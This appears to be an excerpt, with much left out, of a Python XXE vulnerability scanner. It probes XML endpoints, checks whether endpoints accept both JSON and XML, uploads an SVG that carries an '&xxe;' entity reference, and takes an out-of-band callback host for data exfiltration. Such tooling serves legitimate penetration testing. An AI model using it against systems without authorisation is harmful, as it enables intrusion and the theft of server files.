...
def detect_xml_endpoints(base_url, token=None):
    ...
    for ep in endpoints:
        ...
        try:
            resp = requests.post(
                url, headers=headers, data=xml_test, timeout=10, verify=False
            )
...
def test_content_type_switch(base_url, endpoint, token=None):
    ...
    try:
        json_resp = requests.post(
            url, headers=json_headers, json={"search": "test"}, timeout=10, verify=False
        )
        ...
        if xml_resp.status_code not in (415, 400, 404):
            print(
                f"  [!] Endpoint accepts both JSON ({json_resp.status_code}) and XML ({xml_resp.status_code})"
            )
            return True
    except requests.RequestException:
        pass
...
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
    ...
    try:
        ...
        resp = requests.post(
            url, headers=headers, files=files, timeout=15, verify=False
        )
...
def main():
    ...
    parser.add_argument(
        "--endpoint", default="/api/search", help="XML endpoint to test"
    )
    parser.add_argument(
        "--callback", help="OOB callback server (e.g., abc123.oast.fun)"
    )
    ...
    findings.extend(
        test_xxe_payloads(args.base_url, args.endpoint, args.token, args.callback)
    )
    for ep in xml_eps:
        if ep["endpoint"] != args.endpoint:
            findings.extend(
                test_xxe_payloads(
                    args.base_url, ep["endpoint"], args.token, args.callback
                )
            )
    if args.upload_endpoint:
        findings.extend(
            test_svg_upload(args.base_url, args.upload_endpoint, args.token)
        )
